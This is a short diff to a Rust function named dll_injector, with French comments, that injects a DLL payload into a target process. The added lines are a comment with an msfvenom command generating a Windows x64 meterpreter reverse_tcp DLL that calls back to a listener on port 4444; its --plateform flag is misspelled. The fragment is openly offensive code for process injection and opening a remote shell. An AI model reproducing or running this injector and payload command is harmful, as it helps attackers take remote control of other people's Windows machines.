@@ -177,4 +177,8 @@ pub fn dll_injector() {
     //on injecte le payload dans le process cible
     let injected_payload = syringe.inject("injection_payload.dll").unwrap();
     //a test
+
+    //Dll generate
+    //sudo msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --plateform windows -f dll LHOST=ip LPORT=4444 > payload.shellcode
+
 }
